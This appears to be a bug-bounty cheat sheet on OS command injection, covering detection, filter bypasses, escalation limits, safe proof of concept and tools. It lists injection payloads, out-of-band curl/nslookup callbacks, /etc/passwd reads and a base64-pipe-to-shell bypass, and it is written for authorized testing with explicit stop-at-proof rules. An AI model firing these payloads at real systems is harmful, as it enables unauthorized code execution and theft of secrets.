# OS Command Injection

Input reaches a shell → RCE. Rarer but critical. Lives in features that shell out:
ping/traceroute/DNS tools, image/PDF/video processing, git/archive ops, backup,
"export", filename handling, webhooks that call CLIs. Read + reason; prove with a
harmless command, escalate no further.

## Detection

Append shell metacharacters to params that look like they feed a command:
```
; id        | id       || id      && id
`id`        $(id)      %0a id     \n id
& ping -c1 OAST &       ; nslookup OAST ;
```
- **Blind / time-based**: `; sleep 10`, `& timeout 10 &`, `| ping -c 10 127.0.0.1`
  → response delay confirms.
- **OOB**: `; nslookup <token>.oast.host` / `curl OAST` → interactsh callback
  (best for blind — no output needed).

## Bypasses

- Filtered spaces: `${IFS}`, `{cat,/etc/passwd}`, `cat</etc/passwd`, `$IFS$9`.
- Filtered slashes: `${HOME}`, `${PATH:0:1}`.
- Keyword filters: `c'a't`, `c\at`, `who""ami`, base64 `echo <b64>|base64 -d|sh`,
  hex/`$'\x..'`, wildcard `/???/??t`.
- Blocklist metachars: try each of `; | & \n $() \`\` %0a %0d` — one usually passes.
- Argument injection (no shell, but flag injection): `--output=`, `-o`, `@file`.

## Escalation

`id`/`whoami`/`hostname` to prove, then reverse shell / read secrets / cloud
metadata **only if** the program's rules + Safe Harbor clearly permit. Default:
stop at proof of execution.

## Safe PoC

OOB DNS/HTTP callback with a unique token, or a benign command echoing a marker.
Never run destructive commands, drop persistence, or pivot.

## Tools

interactsh (OAST — essential for blind), Caido/Burp Repeater, **commix** (leads,
verify manually), `gf` patterns for candidate params.

## References (current)

- PortSwigger Web Security Academy — OS command injection.
- PayloadsAllTheThings — Command Injection.
